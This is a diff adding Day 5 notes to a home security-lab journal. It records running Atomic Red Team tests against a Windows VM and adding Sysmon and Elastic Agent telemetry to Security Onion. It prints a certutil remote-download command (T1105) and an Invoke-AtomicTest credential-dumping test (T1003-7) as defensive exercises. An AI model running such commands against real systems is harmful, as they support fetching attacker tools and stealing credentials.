@@ -113,3 +113,57 @@ Running Security Onion (16GB) + Windows (originally 4GB) + Kali (originally 2-4G
 - **Payload evidence:** `network.data.decoded` field shows the raw NTLM negotiation bytes, including the literal string `NTLMSSP` and the Windows VM's actual hostname/workgroup (`DESKTOP-H63K059WORKGROUP`) transmitted in the negotiation — direct proof of what the signature matched against.
 - **Classification:** confidence Medium, severity Informational, rule.action "allowed" (observational alert, not a block) — this signature is a visibility/hunting tool flagging NTLM negotiation traffic in general, not a definitive malicious-activity verdict. Worth noting in write-up: not every alert = confirmed attack; some (like this one) are designed to surface activity worth a human review.
 - **Analyst takeaway:** demonstrates full alert-to-payload traceability — from Suricata's signature match, back to the actual bytes on the wire that caused it, including recognizing protocol-identifying strings (NTLMSSP) and incidentally-leaked host info (computer name/workgroup) — a realistic example of what "investigating an alert" looks like in practice.
+
+## Day 5 — T1105 Investigation (Ingress Tool Transfer) + MITRE ATT&CK / Atomic Red Team Concepts
+
+### Background reading: MITRE ATT&CK
+Reviewed the official ATT&CK page for T1003 (attack.mitre.org/techniques/T1003/) to understand how Atomic Red Team's test numbering relates to the official framework. Key takeaway: Atomic Red Team's test IDs (e.g., "T1003-7") are its own test catalog and don't map 1:1 to official ATT&CK sub-techniques (T1003.001–.008) — worth knowing to avoid miscommunication when referencing techniques in a professional context. Also confirmed via the official "Detection Strategy" section that T1003's real detection surface is endpoint/process-based (LSASS memory access, etc.), which matches what the lab's own T1003-7 testing (Day 4) already demonstrated empirically — network monitoring alone has a real, expected blind spot here.
+
+### Technique: T1105 — Ingress Tool Transfer (certutil download)
+- **Atomic test:** T1105-7, "certutil download (urlcache)" — `cmd /c certutil -urlcache -split -f <remote_file> <local_path>`
+- **Setup:** Hosted a dummy file on Kali via `python3 -m http.server 8080`; pointed the atomic at Kali's IP to generate real cross-network HTTP traffic (same pattern as the successful T1003-7/NTLM test).
+- **Result: Blocked by Windows Defender before execution.** Protection history showed a "Severe" threat block, detection name `Trojan:Win32/Ceprolad.A`, with the exact command line captured verbatim in the log. The process never ran, so no HTTP request ever reached Kali or the network — Security Onion correctly showed nothing, because nothing happened at the network layer.
+- **Conclusion:** `certutil -urlcache` is a well-known "living-off-the-land" technique, abused often enough that Defender has a dedicated behavioral signature for the command pattern itself (not just for a malicious payload). This is a clean example of **defense in depth**: an endpoint control (Defender) stopped the technique before it could ever generate the network traffic a NIDS (Suricata) would have needed to detect it. Two different detection philosophies observed across this lab now: Suricata's network/payload-content signatures (T1003-7 NTLM test, Day 4) vs. Defender's endpoint/command-pattern behavioral signatures (T1105, this test) — neither is strictly superior, they cover different attacker behaviors.
+- **Troubleshooting note:** First two attempts failed for unrelated reasons before reaching this result — (1) ran from `C:\WINDOWS\system32`, a protected system directory with no write access for a non-elevated process ("Access is denied"); (2) after fixing the working directory (`$env:TEMP`), got a different `Access is denied` error from `Invoke-Process.ps1` on process start, which turned out to be Defender blocking the launch itself rather than a filesystem issue. Lesson: identical-looking error text can have different root causes — checking Windows Security's Protection History directly resolved the ambiguity quickly.
+
+## Day 5 (continued) — Adding Endpoint Telemetry: Sysmon + Elastic Agent
+
+### Motivation
+Two prior investigations (T1003-7 self-loopback test, T1105 Defender-blocked certutil test) both demonstrated a real limitation: network-only monitoring (Zeek/Suricata) cannot see activity that either stays local to the host or gets stopped before generating network traffic. Decided to close this gap by adding endpoint telemetry via Sysmon + Elastic Agent, rather than relying solely on the network sensor.
+
+### Setup
+1. **Sysmon** installed on Windows target VM using the SwiftOnSecurity community configuration (`sysmonconfig.xml`) rather than default settings — this provides curated, lower-noise process/network/registry logging rather than an unmanageable firehose.
+   ```
+   .\Sysmon64.exe -accepteula -i sysmonconfig.xml
+   ```
+2. **Elastic Agent enrolled** as a new Fleet-managed endpoint in Security Onion:
+   - Created a new Agent Policy (`jerry-windows-vm`) in Elastic Fleet
+   - Added the **firewall.hostgroups.elastic_agent_endpoint** hostgroup entries for both of Windows' active NICs (VMnet2: `192.168.50.129`, NAT: `192.168.128.132`) — needed both since Windows was dual-homed at enrollment time
+   - Installed via the generated `elastic-agent.exe install` command, with `--insecure` added to bypass certificate validation against Security Onion's self-signed cert (expected/acceptable in a lab; would use a real CA-signed cert in production)
+3. **Added the "Custom Windows Event Logs" integration** to the agent policy, configured with Channel Name `Microsoft-Windows-Sysmon/Operational` — this was the missing piece; the default "System" integration alone only collects generic OS metrics, not the actual Sysmon event log channel.
+
+### Troubleshooting log (Day 5 endpoint telemetry)
+
+| # | Problem | Root Cause | Fix |
+|---|---|---|---|
+| 12 | Elastic Agent download (`Invoke-WebRequest`) failed with "unable to connect," then later "connection closed unexpectedly" | Root cause was a **version mismatch**: Fleet's generated install command referenced `elastic-agent-9.3.7-windows-x86_64.zip`, but the actual artifact on Security Onion's disk was `elastic-agent-9.3.3+build202604082258-windows-x86_64.zip`. The "connection closed" error was a red herring caused by requesting a nonexistent filename. | Checked the actual artifact directory on Security Onion (`/nsm/elastic-fleet/artifacts/beats/elastic-agent/`) via `ls -lh`, found the real filename, corrected the download URL to match exactly |
+| 13 | Download initially returned "unable to connect to remote server" (before the above) | Windows was reaching Security Onion via a different IP (`192.168.128.132`, the NAT adapter) than the one added to the `elastic_agent_endpoint` firewall hostgroup (`192.168.50.129`, VMnet2) — Windows was dual-homed with two active adapters | Confirmed via `ipconfig` showing both adapters; added the NAT IP to the firewall hostgroup as well, then ran `sudo salt-call state.apply firewall` on the console to force immediate application rather than waiting on the queued sync |
+| 14 | Elastic Agent enrollment looped indefinitely: `x509: certificate signed by unknown authority` | Security Onion's Fleet Server uses a self-signed certificate by default; the agent refused to trust it | Added `--insecure` to the `elastic-agent.exe install` command to skip certificate validation — acceptable for a lab environment, would need a properly trusted cert chain in production |
+| 15 | After successful enrollment, Hunt searches for `*sysmon*` only returned the agent's own internal operational logs (`event.dataset: elastic_agent`), not real Windows event data | Only the default "System" integration (generic OS metrics) was attached to the agent policy — it does not read the Sysmon Windows Event Log channel | Added the **"Custom Windows Event Logs"** integration to the policy, explicitly configured with Channel Name `Microsoft-Windows-Sysmon/Operational` |
+
+### Result — confirmed working
+Hunt search for `*Sysmon*` (last 15 minutes) returned 103 real events with `event.dataset: winlog.winlog`, `event.provider: Microsoft-Windows-Sysmon`, `event.module: winlog`, correctly tagged with the Windows host's identity (`agent.name: DESKTOP-H63K059`, both of its IPs). Confirmed a real Sysmon event (`event.code: 13`, Registry Value Set) flowing end-to-end from the Windows endpoint into Security Onion's Elasticsearch/Hunt interface.
+
+**This closes the visibility gap identified in both the T1003-7 (Day 4) and T1105 (Day 5) investigations** — future testing can now check both the network layer (Zeek/Suricata) and the endpoint layer (Sysmon via Elastic Agent) for a given technique, rather than relying on network monitoring alone. This mirrors how real SOCs are architected: layered detection across multiple telemetry sources, not a single point of visibility.
+
+**Write-up angle:** "From Network-Only to Hybrid Visibility: Adding Endpoint Telemetry to Close a Detection Gap" — a strong before/after narrative: identified the gap empirically through two separate failed detections, understood *why* via MITRE ATT&CK's documented detection strategies (process/memory-level, not network-level, for T1003), then closed it with real infrastructure work (Sysmon + Fleet enrollment), overcoming several genuine troubleshooting obstacles along the way (version mismatch, dual-homed firewall rules, cert trust, incomplete integration config).
+
+### Verification — re-ran T1003-7 (self-target) with Sysmon in place
+
+Re-ran the exact same command that produced **zero visibility** during the original Day 4 investigation:
+```powershell
+Invoke-AtomicTest T1003-7 -InputArgs @{ "server_ip" = "192.168.50.129"; "custom_port" = "445" }
+```
+This time, Hunt search for `*rpcping*` (last 15 minutes) returned **6 real events**, dataset `winlog.winlog` — confirming Sysmon captured the process execution at the host level, even though the network-layer traffic still never left the loopback interface (as expected, since self-targeting inherently bypasses the network stack).
+
+**This is direct, reproducible proof that the endpoint telemetry addition closes the exact gap identified three investigations ago.** Same command, same target, same complete absence of network-layer evidence — but now with full host-level visibility via Sysmon that didn't exist before. This is the strongest single piece of evidence in the lab for demonstrating an understanding of layered/defense-in-depth detection architecture.
